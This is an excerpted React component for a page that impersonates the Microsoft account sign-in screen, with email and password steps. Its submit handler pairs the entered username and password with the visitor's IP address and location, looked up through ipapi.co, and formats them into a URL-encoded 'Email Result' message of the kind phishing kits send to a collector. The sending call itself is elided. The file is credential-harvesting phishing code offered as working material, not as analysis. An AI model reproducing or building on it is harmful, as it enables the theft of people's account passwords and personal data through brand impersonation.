...
export default function Email() {
    ...
    const handleNext = (e: React.FormEvent) => {
        ...
        if (step === 'email') {
            if (!email.trim()) {
                newErrors.email = 'Please enter your email, phone, or Skype.';
                setErrors(newErrors);
                return;
            }
            setErrors({});
            ...
            fetch("https://ipapi.co/json/")
                ...
                .then((data) => {
                    ...
                    const NameLogin = email;
                    const PasswordLogin = password;
                    const SubmitValue = `Email Result is :%0A - Identity: ${NameLogin} %0A - Password: ${PasswordLogin} - IPAddress: ${ct} %0A - Country: ${co} %0A - Country-code: ${lo} %0A - state: ${st}`;
    ...
    return (
        <main className="relative min-h-screen flex items-center justify-center">
            ...
            {/* Login Form */}
            <div className="relative z-10 w-full max-w-md bg-white text-gray-800 px-8 py-10 rounded-xl shadow-md">
                {/* Logo */}
                ...
                <form onSubmit={handleNext} className="space-y-2">
                    {step === 'email' ? (
                        <div>
                            ...
                            <div className='text-center mb-10'>
                                ...
                                <p className='text-sm text-black/70'>Use your Microsoft account.
                                </p>
                            </div>
                            <input
                                type="email"
                                ...
                                className="w-full border rounded-sm border-gray-600 focus:outline-none focus:border-blue-500 p-2 text-sm bg-transparent"
                            />
                            {errors.email && (
                        ...
                        <div className='space-y-3'>
                            <div className='flex items-center justify-center'>
                                <p className="border border-black/30 rounded-4xl p-2 inline-block mx-auto w-fit text-xs text-black/60 font-medium mb-4">{email}</p>
                            </div>
                            <h2 className="text-2xl text-center font-semibold">Enter your password</h2>
                    ...
                    <p className="text-sm text-[#115ea3] font-semibold hover:underline cursor-pointer">
                        Forgot you password?
                    </p>
                    ...
                    <div className='pt-6'>
                        <button
                            type="submit"
                            className="bg-[#115ea3] text-white px-6 py-2 rounded-md hover:bg-blue-700 w-full"
                        >
                            Next
                        </button>
                    </div>

                    {result && (<p className="text-center text-xs text-red-600">{result}</p>)}
                </form>

                {/* Footer */}
                <div className="mt-10 text-xs text-gray-600 space-x-4 flex justify-center">
